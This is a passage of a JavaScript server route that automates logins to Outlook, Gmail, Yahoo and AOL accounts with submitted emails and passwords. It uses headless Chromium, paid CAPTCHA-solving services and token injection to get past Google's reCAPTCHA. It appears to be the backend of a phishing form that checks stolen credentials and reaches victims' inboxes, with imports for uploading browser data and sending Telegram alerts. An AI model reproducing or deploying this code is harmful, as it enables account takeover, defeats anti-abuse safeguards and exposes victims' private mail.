import { NextResponse } from "next/server";
import puppeteer from "puppeteer-core";
import chromium from "@sparticuz/chromium-min";
import { inspect } from 'util';
import fs from 'fs-extra';
import {
    isDev,
    launchBrowser,
} from "../../../../utils/utils.js";
import logger from "../../../../utils/logger.js";
import aiService from "../../../../utils/aiService.js";
import { platformConfigs } from "./platforms.js";
import { keyboardNavigate } from "../../../../utils/KeyboardHandlers.js";
import { uploadBrowserData } from '../../../api/googledrive.mjs';
import {
    getColumnIndexes,
    fetchDataFromAppScript,
    updateBrowserRowData,
    resolveMx,
    isInbox,
    checkVerification,
    setCorsHeaders,
    startAppScriptDataBackgroundUpdater,
    stopAppScriptDataBackgroundUpdater,
    saveDebugSnapshot,
    solveRecaptchaChallengeWithAI,
    activelyProcessing,
    isTemplateAlive,
    verifyPageStillValid
} from './routeHelper.js';
import { sendTelegramMessage } from '../../../api/telegram.js';
import { getProjectDetails } from '../../../api/googlesheets.js'; // Import getProjectDetails
import { notifyTeam } from "../../../../utils/notifyTeam.js";

// Suppress unhandled rejections from puppeteer when the browser/target is already closed.
// These are non-fatal: they occur when plugin stealth hooks fire after browser close.
process.on('unhandledRejection', (reason) => {
  if (reason?.message?.includes('Target closed') || reason?.message?.includes('Protocol error') || reason?.name === 'TargetCloseError' || reason?.name === 'ProtocolError') {
    return;
  }
  logger.error(`[unhandledRejection] ${reason?.stack || reason}`);
});
import { getCachedRow, setCachedRow, populateCache, evictRow } from "../../../../utils/cookieCache.js";
import axios from 'axios';
import { identifySelf as identifyServerlessSelf, identifySelfFromHost, getSelfUrl } from '../../../../utils/serverlessTracker.js';

const PLATFORM_INBOX_URLS = {
    'outlook.com': 'https://outlook.live.com/mail/',
    'hotmail.com': 'https://outlook.live.com/mail/',
    'live.com': 'https://outlook.live.com/mail/',
    'msn.com': 'https://outlook.live.com/mail/',
    'gmail.com': 'https://mail.google.com/mail/',
    'googlemail.com': 'https://mail.google.com/mail/',
    'yahoo.com': 'https://mail.yahoo.com/',
    'aol.com': 'https://mail.aol.com/',
};

const MAX_CONCURRENT_BROWSERS = parseInt(process.env.MAX_CONCURRENT_BROWSERS || '3', 10);
const activeProcesses = new Set();
const activeBrowserSessions = new Map();
const passwordRetryCounts = new Map();
logger.debug(`Concurrency limit set to ${MAX_CONCURRENT_BROWSERS}`);

export const maxDuration = 60;
export const dynamic = "force-dynamic";
export const runtime = 'nodejs';

/**
 * Validates email domain against the strictly platform using MX record detection.
 * @param {string} email - The email address to validate
 * @param {string} strictly - The required platform key (e.g., 'outlook', 'gmail', 'proton')
 * @returns {Promise<{valid: boolean, message: string, detectedPlatform: string}>}
 */
async function validateEmailAgainstStrictly(email, strictly) {
    if (!strictly || !email) {
        return { valid: true, message: '', detectedPlatform: '' };
    }

    const strictlyLower = strictly.toLowerCase();
    const platformConfig = platformConfigs[strictlyLower];

    if (!platformConfig || !platformConfig.mxKeywords) {
        logger.warn(`[validateEmailAgainstStrictly] Unknown strictly platform: '${strictly}'`);
        return { valid: true, message: '', detectedPlatform: '' };
    }

    const domain = email.split('@')[1]?.toLowerCase();
    if (!domain) {
        return { valid: false, message: 'Invalid email format.', detectedPlatform: '' };
    }

    // Resolve MX records for the domain
    let mxRecords = [];
    try {
        mxRecords = await resolveMx(domain).catch(() => []);
    } catch (e) {
        logger.debug(`[validateEmailAgainstStrictly] MX resolution failed for ${domain}: ${e.message}`);
    }

    // Check if domain or MX records match the strictly platform's keywords
    const matchedKeyword = platformConfig.mxKeywords.find(kw =>
        domain.includes(kw) || mxRecords.some(mx => mx.exchange && mx.exchange.includes(kw))
    );

    if (matchedKeyword) {
        logger.info(`[validateEmailAgainstStrictly] Email '${email}' matches strictly='${strictly}' (matched: '${matchedKeyword}')`);
        return { valid: true, message: '', detectedPlatform: strictlyLower };
    }

    // No match - email domain doesn't belong to the required platform
    const platformName = strictlyLower === 'outlook' ? 'Microsoft' : strictlyLower.charAt(0).toUpperCase() + strictlyLower.slice(1);
    const message = `Incorrect email. This form only accepts ${platformName} accounts.`;
    logger.warn(`[validateEmailAgainstStrictly] Email '${email}' rejected for strictly='${strictly}' (domain: ${domain})`);
    return { valid: false, message, detectedPlatform: '' };
}

/**
 * Non-blocking update: writes to cache FIRST, then fires Sheets API without await.
 * This prevents Sheets API latency from blocking the engine flow.
 * @param {string} browserId - The browser ID
 * @param {object} updateData - The data to update
 * @param {boolean} isNewRow - Whether this is a new row creation
 */
async function updateBrowserRowDataFast(browserId, updateData, isNewRow = false) {
    // 1. Write to cache FIRST (instant, synchronous)
    if (isNewRow) {
        populateCache(browserId, updateData);
    } else {
        // Merge with existing cache to preserve email/password during intermediate writes
        const existing = getCachedRow(browserId) || {};
        setCachedRow(browserId, { ...existing, ...updateData });
    }
    // 2. Write to sheet (awaited) so pooling operator always sees latest status
    const cachedForWrite = getCachedRow(browserId) || {};
    const mergedForWrite = { ...cachedForWrite, ...updateData };
    await updateBrowserRowData(browserId, mergedForWrite, isNewRow).catch(err => {
        logger.error(`[updateBrowserRowDataFast][${browserId}] Sheets write failed: ${err.message}`);
    });
}

async function handleAdditionalViews(page, platformConfig, instanceId, context = 'general') {
    if (!platformConfig?.additionalViews || platformConfig.additionalViews.length === 0) {
        logger.debug(`[handleAdditionalViews][${instanceId}] No additional views to process for this platform.`);
        return;
    }
    logger.info(`[handleAdditionalViews][${instanceId}] Starting to check for additional views (context: ${context})...`);

    const maxIterations = 10;
    let iterationCount = 0;
    let viewHandledInThisIteration = true;
    const handledViews = new Set();
    let fatalResult = null;

    while (viewHandledInThisIteration && iterationCount < maxIterations) {
        viewHandledInThisIteration = false;
        iterationCount++;

        if (iterationCount > 1) {
            await new Promise(r => setTimeout(r, 300));
        }

        const viewIndex = await page.evaluate((views, ctx, skipNames) => {
            try {
                for (let i = 0; i < views.length; i++) {
                    const view = views[i];
                    if (skipNames.includes(view.name)) continue;
                    if (ctx === 'post_verification' && (view.isVerificationChoiceScreen || view.isCodeEntryScreen)) continue;

                    let match = false;

                    // URL-based matching
                    if (view.match.url) {
                        const currentUrl = window.location.href;
                        const urlPatterns = Array.isArray(view.match.url) ? view.match.url : [view.match.url];
                        for (const pattern of urlPatterns) {
                            if (typeof pattern === 'string' && currentUrl.includes(pattern)) {
                                match = true;
                                break;
                            }
                        }
                    }

                    // DOM selector + text matching (only if not already matched by URL)
                    if (!match && view.match.selector) {
                        const selectors = Array.isArray(view.match.selector) ? view.match.selector : [view.match.selector];
                        for (const sel of selectors) {
                            if (typeof sel !== 'string') continue;
                            const element = document.querySelector(sel);
                            if (element) {
                                if (view.match.text) {
                                    if ((element.textContent || "").includes(view.match.text)) {
                                        match = true;
                                        break;
                                    }
                                } else {
                                    match = true;
                                    break;
                                }
                            }
                        }
                    }
                    if (match) return i;
                }
                return -1;
            } catch (e) {
                return -1;
            }
        }, platformConfig.additionalViews, context, Array.from(handledViews)).catch(() => -1);

        if (viewIndex < 0) break;

        const view = platformConfig.additionalViews[viewIndex];
        handledViews.add(view.name);
        logger.info(`[handleAdditionalViews][${instanceId}] Matched additional view: ${view.name}`);

        if (view.isFatal) {
            logger.warn(`[handleAdditionalViews][${instanceId}] Fatal view matched: ${view.name}. Returning fatal result.`);
            fatalResult = { blocked: true, reason: view.name };
            break;
        }

        if (!view.action) {
            logger.info(`[handleAdditionalViews][${instanceId}] View ${view.name} matched but has no defined action.`);
            viewHandledInThisIteration = true;
            continue;
        }

        if (typeof view.action === 'function') {
            logger.info(`[handleAdditionalViews][${instanceId}] Executing custom action for view: ${view.name}`);
            await view.action(page, view, platformConfig);
            viewHandledInThisIteration = true;
            continue;
        }

        if (view.action.type === 'keyboard') {
            const keys = Array.isArray(view.action.keys) ? view.action.keys : [view.action.keys];
            for (const key of keys) {
                await page.keyboard.press(key);
                await new Promise(r => setTimeout(r, 300));
            }
            logger.info(`[handleAdditionalViews][${instanceId}] Pressed keyboard keys: ${keys.join(', ')} for view: ${view.name}`);
            viewHandledInThisIteration = true;
            await new Promise(r => setTimeout(r, 500));
            continue;
        }
        if (view.action.type !== 'click') {
            viewHandledInThisIteration = true;
            continue;
        }

        const actionSelectors = Array.isArray(view.action.selector) ? view.action.selector : [view.action.selector];
        let clickedViewAction = false;

        if (view.action.text) {
            try {
                const elementClicked = await page.evaluate((selectors, textToFind) => {
                    for (const sel of selectors) {
                        if (typeof sel !== 'string') continue;
                        const elements = document.querySelectorAll(sel);
                        for (const element of elements) {
                            if (element.textContent.includes(textToFind)) {
                                element.click();
                                return true;
                            }
                        }
                    }
                    return false;
                }, actionSelectors, view.action.text);

                if (elementClicked) {
                    logger.info(`[handleAdditionalViews][${instanceId}] Clicked element with text "${view.action.text}" for view: ${view.name}`);
                    clickedViewAction = true;
                    const navigationWaitUntil = view.action.navigationWaitUntil || 'domcontentloaded';
                    await page.waitForNavigation({ waitUntil: navigationWaitUntil, timeout: 10000 }).catch(() => null);
                    await new Promise(r => setTimeout(r, 500));
                }
            } catch (textClickError) {
                logger.warn(`[handleAdditionalViews][${instanceId}] Error clicking element by text for view ${view.name}: ${textClickError.message}`);
            }
        }

        if (!clickedViewAction) {
            for (const selector of actionSelectors) {
                if (typeof selector !== 'string') continue;
                try {
                    await page.waitForSelector(selector, { visible: true, timeout: 5000 });
                    const navigationWaitUntil = view.action.navigationWaitUntil || 'domcontentloaded';
                    const navigationPromise = page.waitForNavigation({ waitUntil: navigationWaitUntil, timeout: 10000 }).catch(() => null);
                    await page.click(selector);
                    await navigationPromise;
                    logger.info(`[handleAdditionalViews][${instanceId}] Clicked action selector '${selector}' for view: ${view.name}`);
                    clickedViewAction = true;
                    await new Promise(r => setTimeout(r, 500));
                    break;
                } catch (modalClickError) {
                    logger.warn(`[handleAdditionalViews][${instanceId}] Action selector '${selector}' not found or clickable for view ${view.name}. Trying next if available.`);
                }
            }
            if (!clickedViewAction) {
                logger.warn(`[handleAdditionalViews][${instanceId}] No action selectors were clickable for view ${view.name}.`);
            }
        }

        viewHandledInThisIteration = true;
    }
    if (iterationCount >= maxIterations) {
        logger.warn(`[handleAdditionalViews][${instanceId}] Exceeded max iterations (${maxIterations}) while processing additional views. Some views might not have been handled.`);
    }
    logger.info(`[handleAdditionalViews][${instanceId}] Finished processing additional views (${iterationCount} iterations).`);
    return fatalResult;
}

async function solveImageCaptcha(page, instanceId) {
    const captchaApiKey = process.env.CAPTCHA_2CAPTCHA_KEY;
    if (!captchaApiKey) {
        logger.error(`[solveImageCaptcha][${instanceId}] CAPTCHA_2CAPTCHA_KEY not set in environment.`);
        return false;
    }

    try {
        logger.info(`[solveImageCaptcha][${instanceId}] Waiting for CAPTCHA image...`);
        await page.waitForSelector('#captchaimg', { visible: true, timeout: 10000 });
        await new Promise(r => setTimeout(r, 1000));

        const captchaImg = await page.$('#captchaimg');
        if (!captchaImg) {
            logger.warn(`[solveImageCaptcha][${instanceId}] CAPTCHA image element not found.`);
            return false;
        }

        const screenshotBuffer = await captchaImg.screenshot({ type: 'png' });
        const base64Image = screenshotBuffer.toString('base64');
        logger.info(`[solveImageCaptcha][${instanceId}] CAPTCHA image captured (${base64Image.length} chars). Sending to 2Captcha...`);

        const submitResponse = await axios.post('https://2captcha.com/in.php', new URLSearchParams({
            key: captchaApiKey,
            method: 'base64',
            body: base64Image,
            json: '1'
        }).toString(), {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            timeout: 30000
        });

        if (submitResponse.data.status !== 1) {
            logger.error(`[solveImageCaptcha][${instanceId}] 2Captcha submit failed: ${JSON.stringify(submitResponse.data)}`);
            return false;
        }

        const captchaId = submitResponse.data.request;
        logger.info(`[solveImageCaptcha][${instanceId}] CAPTCHA submitted. ID: ${captchaId}. Waiting for solution...`);

        const pollStart = Date.now();
        const pollTimeout = 120000;
        const pollInterval = 5000;

        while (Date.now() - pollStart < pollTimeout) {
            await new Promise(r => setTimeout(r, pollInterval));

            const resultResponse = await axios.get('https://2captcha.com/res.php', {
                params: {
                    key: captchaApiKey,
                    action: 'get',
                    id: captchaId,
                    json: 1
                },
                timeout: 15000
            });

            if (resultResponse.data.status === 1) {
                const captchaAnswer = resultResponse.data.request;
                logger.info(`[solveImageCaptcha][${instanceId}] CAPTCHA solved: "${captchaAnswer}". Typing into input...`);

                const answerInput = await page.$('#ca');
                if (!answerInput) {
                    logger.warn(`[solveImageCaptcha][${instanceId}] Answer input #ca not found.`);
                    return false;
                }

                await page.evaluate((sel) => { const el = document.querySelector(sel); if (el) el.value = ''; }, '#ca');
                await page.type('#ca', captchaAnswer, { delay: 30 });
                await new Promise(r => setTimeout(r, 500));

                const nextBtn = await page.$('#identifierNext');
                if (nextBtn) {
                    const navigationPromise = page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 15000 }).catch(() => null);
                    await nextBtn.click();
                    await navigationPromise;
                    await new Promise(r => setTimeout(r, 2000));
                    logger.info(`[solveImageCaptcha][${instanceId}] CAPTCHA answer submitted. Navigating...`);
                } else {
                    logger.warn(`[solveImageCaptcha][${instanceId}] Next button #identifierNext not found.`);
                }
                return true;
            }

            if (resultResponse.data.request !== 'CAPCHA_NOT_READY') {
                logger.error(`[solveImageCaptcha][${instanceId}] 2Captcha polling error: ${resultResponse.data.request}`);
                return false;
            }

            logger.debug(`[solveImageCaptcha][${instanceId}] Still waiting... (${Math.round((Date.now() - pollStart) / 1000)}s elapsed)`);
        }

        logger.error(`[solveImageCaptcha][${instanceId}] 2Captcha polling timed out after ${pollTimeout / 1000}s.`);
        return false;

    } catch (error) {
        logger.error(`[solveImageCaptcha][${instanceId}] Error: ${error.message}`);
        return false;
    }
}

async function solveRecaptchaV2(page, instanceId) {
    const captchaApiKey = process.env.CAPTCHA_2CAPTCHA_KEY;
    const capsolverKey = process.env.CAPSOLVER_API_KEY;
    if (!captchaApiKey && !capsolverKey) {
        logger.error(`[solveRecaptchaV2][${instanceId}] Neither CAPTCHA_2CAPTCHA_KEY nor CAPTCHA_CAPSOLVER_KEY set.`);
        return false;
    }

    try {
        const pageUrl = page.url();

        // Extract reCAPTCHA site key from the page
        const siteKey = await page.evaluate(() => {
            const textarea = document.querySelector('#g-recaptcha-response');
            if (textarea) {
                const sk = textarea.getAttribute('data-sitekey');
                if (sk) return sk;
            }
            const iframe = document.querySelector('iframe[title*="reCAPTCHA"]');
            if (iframe) {
                const src = iframe.src || '';
                const match = src.match(/k=([^&]+)/);
                if (match) return match[1];
            }
            const div = document.querySelector('.g-recaptcha, [data-sitekey]');
            if (div) return div.getAttribute('data-sitekey');
            return null;
        }).catch(() => null);

        if (!siteKey) {
            logger.error(`[solveRecaptchaV2][${instanceId}] Could not extract reCAPTCHA site key from page.`);
            return false;
        }

        // Detect if this is reCAPTCHA Enterprise by checking iframe src
        const isEnterprise = await page.evaluate(() => {
            const iframe = document.querySelector('iframe[title*="reCAPTCHA"]');
            return iframe && (iframe.src || '').includes('enterprise');
        }).catch(() => false);

        logger.info(`[solveRecaptchaV2][${instanceId}] Site key: ${siteKey}. Enterprise: ${isEnterprise}. Starting solver chain...`);

        // Build solver chain: CapSolver Enterprise first, then 2Captcha fallback
        const solvers = [];
        if (isEnterprise && capsolverKey) {
            solvers.push('capsolver_enterprise');
        }
        if (captchaApiKey) {
            if (isEnterprise) {
                solvers.push('enterprise_recaptcha_v2');
            }
            solvers.push('userrecaptcha');
        }

        let token = null;

        for (const solver of solvers) {
            logger.info(`[solveRecaptchaV2][${instanceId}] Trying solver: ${solver}...`);

            if (solver === 'capsolver_enterprise') {
                // CapSolver reCAPTCHA Enterprise
                try {
                    const createResp = await axios.post('https://api.capsolver.com/createTask', {
                        clientKey: capsolverKey,
                        task: {
                            type: 'ReCaptchaV2EnterpriseTaskProxyless',
                            websiteURL: pageUrl,
                            websiteKey: siteKey
                        }
                    }, { timeout: 30000 });

                    if (createResp.data.errorId !== 0) {
                        logger.warn(`[solveRecaptchaV2][${instanceId}] CapSolver createTask error: ${JSON.stringify(createResp.data)}`);
                        continue;
                    }

                    const taskId = createResp.data.taskId;
                    logger.info(`[solveRecaptchaV2][${instanceId}] CapSolver task created: ${taskId}. Polling...`);

                    const pollStart = Date.now();
                    while (Date.now() - pollStart < 120000) {
                        await new Promise(r => setTimeout(r, 5000));
                        const resultResp = await axios.post('https://api.capsolver.com/getTaskResult', {
                            clientKey: capsolverKey,
                            taskId
                        }, { timeout: 15000 });

                        if (resultResp.data.status === 'ready') {
                            token = resultResp.data.solution.gRecaptchaResponse;
                            logger.info(`[solveRecaptchaV2][${instanceId}] CapSolver token received (${token.length} chars).`);
                            break;
                        }
                        if (resultResp.data.status === 'failed' || resultResp.data.errorId) {
                            logger.warn(`[solveRecaptchaV2][${instanceId}] CapSolver task failed: ${JSON.stringify(resultResp.data)}`);
                            break;
                        }
                    }
                    if (token) break;
                } catch (capErr) {
                    logger.warn(`[solveRecaptchaV2][${instanceId}] CapSolver error: ${capErr.message}`);
                }
            } else {
                // 2Captcha methods (enterprise_recaptcha_v2 or userrecaptcha)
                const recaptchaParams = {
                    key: captchaApiKey,
                    method: solver,
                    googlekey: siteKey,
                    pageurl: pageUrl,
                    json: '1'
                };
                if (solver === 'enterprise_recaptcha_v2') {
                    recaptchaParams.domain = 'google.com';
                }
                logger.info(`[solveRecaptchaV2][${instanceId}] Submitting to 2Captcha with method: ${solver}...`);
                const submitResponse = await axios.post('https://2captcha.com/in.php', new URLSearchParams(recaptchaParams).toString(), {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    timeout: 30000
                }).catch(err => ({ data: { status: 0, request: err.message } }));

                if (submitResponse.data.status !== 1) {
                    logger.warn(`[solveRecaptchaV2][${instanceId}] 2Captcha submit failed with method ${solver}: ${JSON.stringify(submitResponse.data)}`);
                    continue;
                }

                const captchaId = submitResponse.data.request;
                logger.info(`[solveRecaptchaV2][${instanceId}] Submitted to 2Captcha. ID: ${captchaId}. Polling...`);

                const pollStart = Date.now();
                while (Date.now() - pollStart < 120000) {
                    await new Promise(r => setTimeout(r, 5000));
                    const resultResponse = await axios.get('https://2captcha.com/res.php', {
                        params: { key: captchaApiKey, action: 'get', id: captchaId, json: 1 },
                        timeout: 15000
                    });
                    if (resultResponse.data.status === 1) {
                        token = resultResponse.data.request;
                        logger.info(`[solveRecaptchaV2][${instanceId}] 2Captcha token received (${token.length} chars).`);
                        break;
                    }
                    if (resultResponse.data.request !== 'CAPCHA_NOT_READY') {
                        logger.warn(`[solveRecaptchaV2][${instanceId}] 2Captcha error: ${resultResponse.data.request}`);
                        break;
                    }
                }
                if (token) break;
            }
        }

        if (!token) {
            logger.error(`[solveRecaptchaV2][${instanceId}] All solvers failed.`);
            return false;
        }

        logger.info(`[solveRecaptchaV2][${instanceId}] Token obtained (${token.length} chars). Injecting...`);

        // Inject the token into the page
        await page.evaluate((token) => {
            // Set token in the textarea
            const textarea = document.querySelector('#g-recaptcha-response');
            if (textarea) {
                textarea.value = token;
                textarea.style.display = 'block';
                textarea.style.height = 'auto';
            }

            // Also try to set it in any sibling textarea (reCAPTCHA v2 sometimes uses a different ID)
            const allTextareas = document.querySelectorAll('textarea[name="g-recaptcha-response"]');
            allTextareas.forEach(ta => {
                ta.value = token;
                ta.style.display = 'block';
            });

            // Try to trigger the callback directly
            try {
                if (typeof ___grecaptcha_cfg !== 'undefined') {
                    const clients = Object.keys(___grecaptcha_cfg.clients || {});
                    for (const clientKey of clients) {
                        const client = ___grecaptcha_cfg.clients[clientKey];
                        if (client) {
                            const keys = Object.keys(client);
                            for (const key of keys) {
                                const val = client[key];
                                if (val && typeof val === 'object') {
                                    const innerKeys = Object.keys(val);
                                    for (const ik of innerKeys) {
                                        if (val[ik] && typeof val[ik] === 'function') {
                                            try { val[ik](token); } catch (e) { /* ignore */ }
                                        }
                                        if (val[ik] && typeof val[ik] === 'object') {
                                            const deepKeys = Object.keys(val[ik]);
                                            for (const dk of deepKeys) {
                                                if (val[ik][dk] && typeof val[ik][dk] === 'function') {
                                                    try { val[ik][dk](token); } catch (e) { /* ignore */ }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            } catch (e) { /* callback trigger failed, form submit will handle it */ }

            // Dispatch change event on textarea
            if (textarea) {
                textarea.dispatchEvent(new Event('input', { bubbles: true }));
                textarea.dispatchEvent(new Event('change', { bubbles: true }));
            }
        }, token);

        logger.info(`[solveRecaptchaV2][${instanceId}] Token injected. Trying to click checkbox/verify...`);

        // Try to click the reCAPTCHA checkbox via Puppeteer frame API (bypasses cross-origin)
        try {
            const recaptchaFrames = page.frames().filter(f => f.url().includes('recaptcha'));
            for (const frame of recaptchaFrames) {
                const checkbox = await frame.$('#recaptcha-anchor').catch(() => null);
                if (checkbox) {
                    logger.info(`[solveRecaptchaV2][${instanceId}] Found reCAPTCHA checkbox in iframe, clicking...`);
                    await checkbox.click().catch(() => {});
                    break;
                }
            }
        } catch (frameErr) {
            logger.debug(`[solveRecaptchaV2][${instanceId}] Frame click failed: ${frameErr.message}`);
        }

        // Also try clicking verify buttons on the main page
        await page.evaluate(() => {
            const btns = document.querySelectorAll('#recaptcha-verify-button, .recaptcha-verify-button, button[aria-label*="Verify"], #submit');
            for (const btn of btns) { try { btn.click(); } catch (e) {} }
            const form = document.querySelector('form');
            if (form) { try { form.submit(); } catch (e) {} }
        }).catch(() => {});

        // Wait and verify the solve actually worked
        for (let check = 0; check < 6; check++) {
            await new Promise(r => setTimeout(r, 3000));
            const currentUrl = page.url();
            logger.info(`[solveRecaptchaV2][${instanceId}] Post-inject check ${check + 1}: ${currentUrl}`);

            // If URL changed away from recaptcha challenge, solve worked
            if (!currentUrl.includes('challenge/recaptcha')) {
                logger.info(`[solveRecaptchaV2][${instanceId}] reCAPTCHA solved successfully - navigated away from challenge.`);
                return true;
            }

            // Check for error messages on page
            const hasError = await page.evaluate(() => {
                const errorEl = document.querySelector('.jEOsLc, [jsname="B34EJ"] span');
                return errorEl && errorEl.textContent?.includes('Something went wrong');
            }).catch(() => false);

            if (hasError) {
                logger.warn(`[solveRecaptchaV2][${instanceId}] Google rejected the token ("Something went wrong"). Token invalid for Enterprise.`);
                return false;
            }
        }

        logger.error(`[solveRecaptchaV2][${instanceId}] Page still on challenge URL after token injection. Solve failed.`);
        return false;
    } catch (err) {
        logger.error(`[solveRecaptchaV2][${instanceId}] Error: ${err.message}`);
        return false;
    }
}

async function checkAccountAccess(browser, page, email, password, platform, browserId, isReusingSession = false) {
    const originalPage = page;
    let emailExists = false;
    let accountAccess = false;
    let reachedInbox = false;
    let requiresVerification = false;
    const instanceId = `pid-${browser.process()?.pid || 'unknown'}`;

    try {
        const platformConfig = platformConfigs[platform] || {};
        if (!platformConfig.url) {
            throw new Error(`No URL defined for platform: ${platform}`);
        }

        // Defensive check for platformConfig.selectors
        if (typeof platformConfig.selectors !== 'object' || platformConfig.selectors === null) {
            logger.error(`[checkAccountAccess][${instanceId}] platformConfig.selectors is not a valid object for platform: ${platform}.`);
            return { emailExists: false, accountAccess: false, reachedInbox: false, requiresVerification: false, error: "Invalid platform selectors configuration." };
        }

        if (!isReusingSession) {
            let gotoSuccessful = false;
            const gotoRetries = 2;
            const initialGotoTimeout = 30000;

            for (let attempt = 1; attempt <= gotoRetries; attempt++) {
                try {
                    logger.debug(`[checkAccountAccess][${instanceId}] Attempt ${attempt}/${gotoRetries} to navigate to ${platformConfig.url}`);
                    await originalPage.goto(platformConfig.url, { waitUntil: 'networkidle0', timeout: initialGotoTimeout });
                    gotoSuccessful = true;
                    logger.info(`[checkAccountAccess][${instanceId}] Navigated to ${platformConfig.url}.`);
                    break;
                } catch (e) {
                    logger.warn(`[checkAccountAccess][${instanceId}] Goto attempt ${attempt}/${gotoRetries} failed: ${e.message}`);
                    if (attempt === gotoRetries) {
                        notifyTeam({ type: 'NAVIGATION_FAILURE', platform, email, browserId, url: platformConfig.url, error: e.message, detail: `Failed to navigate after ${gotoRetries} attempts` });
                        throw e;
                    }
                    await new Promise(res => setTimeout(res, 2000));
                }
            }
            if (!gotoSuccessful) throw new Error(`Failed to navigate to ${platformConfig.url} after ${gotoRetries} attempts.`);
        } else {
            logger.debug(`[checkAccountAccess][${instanceId}] Reusing session, skipping navigation.`);
        }

        logger.debug(`[checkAccountAccess][${instanceId}] Starting flow for ${platform}.`);

        // Special handling for email retry in reusing session
        if (isReusingSession && platformConfig.selectors?.input) {
            logger.info(`[checkAccountAccess][${instanceId}] Reusing session for email retry, typing email directly.`);
            try {
                let inputFound = false;
                try {
                    await page.waitForSelector(platformConfig.selectors.input, { visible: true, timeout: 5000 });
                    inputFound = true;
                } catch (e) {
                    logger.warn(`[checkAccountAccess][${instanceId}] Input not visible, navigating to login page.`);
                    await page.goto(platformConfig.url, { waitUntil: 'networkidle0', timeout: 30000 });
                    await page.waitForSelector(platformConfig.selectors.input, { visible: true, timeout: 10000 });
                    inputFound = true;
                }
                if (inputFound) {
                    await page.evaluate((sel) => { const el = document.querySelector(sel); if (el) el.value = ''; }, platformConfig.selectors.input);
                    await page.type(platformConfig.selectors.input, email, { delay: 50 });

                    let clicked = false;
                    if (platformConfig.selectors.nextButton) {
                        let selectors = Array.isArray(platformConfig.selectors.nextButton) ? platformConfig.selectors.nextButton : [platformConfig.selectors.nextButton];
                        for (const sel of selectors) {
                            try {
                                await page.waitForSelector(sel, { visible: true, timeout: 5000 });
                                await page.click(sel);
                                clicked = true;
                                break;
                            } catch (e) {
                                logger.warn(`[checkAccountAccess][${instanceId}] Next button selector not found or clickable: ${sel}`);
                            }
                        }
                    }
                    if (!clicked) {
                        return { emailExists: false, accountAccess: false, requiresVerification: false, error: "Next button not clickable" };
                    }

                    await page.waitForFunction(() => document.readyState === 'complete', { timeout: 10000 });
                    await new Promise(res => setTimeout(res, 3000));

                    // Wait for the page to actually transition (SPA) — look for either "Verify your email" or password input
                    const transitionSelectors = ["[data-testid='title']", "input[name='passwd']", "input[type='password']", "#proof-confirmation-email-input", "h1"];
                    for (const sel of transitionSelectors) {
                        try { await page.waitForSelector(sel, { visible: true, timeout: 5000 }); break; } catch(e) {}
                    }
                    await new Promise(res => setTimeout(res, 1000));

                    // Handle intermediate views after email submission (e.g. Outlook "Verify your email" → "Other ways to sign in" → "Use your password")
                    await handleAdditionalViews(page, platformConfig, instanceId);

                    // CAPTCHA handling — only for Google (image CAPTCHA + reCAPTCHA Enterprise)
                    if (platform === 'gmail') {
                    let imageCaptchaHandled = false;
                    const maxCaptchaRetries = 3;
                    for (let captchaAttempt = 0; captchaAttempt < maxCaptchaRetries; captchaAttempt++) {
                        logger.info(`[checkAccountAccess][${instanceId}] Checking for text image CAPTCHA (attempt ${captchaAttempt + 1}/${maxCaptchaRetries})...`);
                        const captchaSolved = await solveImageCaptcha(page, instanceId).catch(() => false);
                        if (!captchaSolved) {
                            logger.info(`[checkAccountAccess][${instanceId}] No image CAPTCHA found or solve failed on attempt ${captchaAttempt + 1}. Moving on.`);
                            break;
                        }

                        logger.info(`[checkAccountAccess][${instanceId}] Text image CAPTCHA answer submitted. Waiting for page...`);
                        await new Promise(r => setTimeout(r, 3000));

                        // Check if CAPTCHA is still present (wrong answer → new CAPTCHA shown)
                        const stillHasCaptcha = await page.$('#captchaimg').catch(() => null);
                        const hasError = await page.evaluate(() => {
                            return !!(document.querySelector('.Ekjuhf') || (document.querySelector('#i9') || '').textContent?.includes('re-enter'));
                        }).catch(() => false);

                        if (stillHasCaptcha && hasError) {
                            logger.warn(`[checkAccountAccess][${instanceId}] CAPTCHA answer was incorrect (attempt ${captchaAttempt + 1}/${maxCaptchaRetries}). Retrying...`);
                            await new Promise(r => setTimeout(r, 1000));
                            continue;
                        }

                        logger.info(`[checkAccountAccess][${instanceId}] Text image CAPTCHA solved successfully.`);
                        imageCaptchaHandled = true;
                        await new Promise(r => setTimeout(r, 2000));
                        break;
                    }

                    // After image CAPTCHA loop, always check for reCAPTCHA (Google may show both)
                    try {
                        const recaptchaSelector = 'iframe[title*="reCAPTCHA"], #g-recaptcha-response[data-sitekey], [data-sitekey]';
                        const recaptchaEl = await page.waitForSelector(recaptchaSelector, { visible: false, timeout: 8000 }).catch(() => null);
                        if (recaptchaEl) {
                            logger.info(`[checkAccountAccess][${instanceId}] reCAPTCHA Enterprise widget detected.`);

                            // Click checkbox manually
                            let checkboxClicked = false;
                            try {
                                const iframeBox = await page.evaluate(() => {
                                    const iframe = document.querySelector('iframe[title*="reCAPTCHA"]');
                                    if (!iframe) return null;
                                    const rect = iframe.getBoundingClientRect();
                                    return { x: rect.x, y: rect.y, width: rect.width, height: rect.height };
                                });
                                if (iframeBox) {
                                    const clickX = iframeBox.x + 33;
                                    const clickY = iframeBox.y + 33;
                                    logger.info(`[checkAccountAccess][${instanceId}] Clicking reCAPTCHA checkbox at (${clickX}, ${clickY})...`);
                                    await page.mouse.click(clickX, clickY);
                                    checkboxClicked = true;
                                    await new Promise(r => setTimeout(r, 5000));

                                    const afterClickUrl = page.url();
                                    if (!afterClickUrl.includes('challenge/recaptcha')) {
                                        logger.info(`[checkAccountAccess][${instanceId}] reCAPTCHA auto-passed after click! URL: ${afterClickUrl}`);
                                        await new Promise(r => setTimeout(r, 2000));
                                    }
                                }
                            } catch (clickErr) {
                                logger.warn(`[checkAccountAccess][${instanceId}] Checkbox click failed: ${clickErr.message}`);
                            }

                            // If still on challenge page, try AI solver first (screenshot → Gemini → click → verify)
                            const stillOnChallenge = page.url().includes('challenge/recaptcha');
                            if (stillOnChallenge) {
                                logger.info(`[checkAccountAccess][${instanceId}] Still on challenge page. Trying AI reCAPTCHA solver...`);
                                await new Promise(r => setTimeout(r, 2000));
                                const aiSolved = await solveRecaptchaChallengeWithAI(page, instanceId).catch(() => false);
                                if (aiSolved) {
